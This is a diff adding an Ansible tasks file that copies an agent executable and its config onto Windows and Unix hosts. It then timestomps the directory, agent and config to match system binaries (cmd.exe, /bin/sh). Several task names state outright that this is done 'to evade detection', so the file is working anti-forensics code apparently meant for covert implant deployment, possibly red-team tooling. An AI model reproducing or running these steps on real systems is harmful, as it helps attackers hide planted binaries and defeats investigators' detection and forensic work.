@@ -1,0 +1,84 @@
+---
+- name: Ensure destination directory exists
+  ansible.windows.win_file:
+    path: "{{ stabvest_deploy_dir_win }}"
+    state: directory
+  when: ansible_facts.os_family == "Windows" 
+
+- name: Ensure destination directory exists
+  ansible.builtin.file:
+    path: "{{ stabvest_deploy_dir_unix }}"
+    state: directory
+    owner: root
+    group: root
+    mode: '0755'
+  when: ansible_facts.os_family != "Windows" 
+
+- name: Copy agent executable to target
+  win_copy:
+    src: "files/{{ stabvest_agent_executable }}"
+    dest: "{{ stabvest_deploy_dir_win }}\\agent.exe"
+  when: ansible_facts.os_family == "Windows" 
+
+- name: Render config.json from template
+  template:
+    src: "config.json.j2"
+    dest: "{{ stabvest_deploy_dir_win }}\\config.json"
+  when: ansible_facts.os_family == "Windows" 
+
+- name: Render config.json from template
+  template:
+    src: "config.json.j2"
+    dest: "{{ stabvest_deploy_dir_unix }}/config.json"
+  when: ansible_facts.os_family != "Windows" 
+
+- name: Copy agent executable to target
+  copy:
+    src: "files/{{ stabvest_agent_executable }}"
+    dest: "{{ stabvest_deploy_dir_unix }}/agent.bin"
+    owner: root
+    group: root
+    mode: '0755'
+  when: ansible_facts.os_family != "Windows" 
+
+- name: Timestomp folder to evade detection
+  win_shell: |
+    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+    (Get-Item "{{ stabvest_deploy_dir_win }}").CreationTime = $time
+    (Get-Item "{{ stabvest_deploy_dir_win }}").LastWriteTime = $time
+    (Get-Item "{{ stabvest_deploy_dir_win }}").LastAccessTime = $time
+  args:
+    executable: "powershell.exe"
+  when: ansible_facts.os_family == "Windows" 
+
+- name: Timestomp agent to evade detection
+  win_shell: |
+    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+    (Get-Item "{{ stabvest_deploy_dir_win }}\\agent.exe").CreationTime = $time
+    (Get-Item "{{ stabvest_deploy_dir_win }}\\agent.exe").LastWriteTime = $time
+    (Get-Item "{{ stabvest_deploy_dir_win }}\\agent.exe").LastAccessTime = $time
+  args:
+    executable: "powershell.exe"
+  when: ansible_facts.os_family == "Windows" 
+
+- name: Timestomp config to evade detection
+  win_shell: |
+    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+    (Get-Item "{{ stabvest_deploy_dir_win }}\\config.json").CreationTime = $time
+    (Get-Item "{{ stabvest_deploy_dir_win }}\\config.json").LastWriteTime = $time
+    (Get-Item "{{ stabvest_deploy_dir_win }}\\config.json").LastAccessTime = $time
+  args:
+    executable: "powershell.exe"
+  when: ansible_facts.os_family == "Windows" 
+
+- name: Timestomp the folder
+  command: touch -r /bin/sh {{ stabvest_deploy_dir_unix }}
+  when: ansible_facts.os_family != "Windows"
+
+- name: Timestomp the agent
+  command: touch -r /bin/sh {{ stabvest_deploy_dir_unix }}/agent.bin
+  when: ansible_facts.os_family != "Windows"
+
+- name: Timestomp the config
+  command: touch -r /bin/sh {{ stabvest_deploy_dir_unix }}/config.json
+  when: ansible_facts.os_family != "Windows"
